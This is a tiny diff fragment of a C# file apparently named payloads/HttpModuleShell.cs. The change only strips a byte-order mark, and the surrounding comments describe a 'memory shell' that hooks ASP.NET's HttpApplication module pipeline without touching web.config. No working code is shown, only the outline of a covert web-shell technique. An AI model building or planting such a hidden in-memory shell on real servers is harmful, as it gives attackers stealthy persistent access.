@@ -1,4 +1,4 @@
-﻿// payloads/HttpModuleShell.cs
+// payloads/HttpModuleShell.cs
 // ---------------------------------------------------------------------------
 // Memory shell #1: HttpApplication module-event pipeline (no web.config change).
 //
